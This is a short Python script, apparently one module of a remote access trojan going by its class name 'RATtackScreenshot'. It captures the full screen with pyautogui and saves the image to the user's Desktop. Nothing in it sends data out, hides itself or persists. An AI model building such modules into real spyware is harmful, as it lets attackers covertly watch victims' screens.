import pyautogui
import os






class RATtackScreenshot:
    def __init__(self,screenshotname):
        self.screenshotname = screenshotname
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop\\')



        self.screenshotname = pyautogui.screenshot()
        self.screenshotname.save(desktop + str(screenshotname))









p1 = RATtackScreenshot("Markdd.jpg")
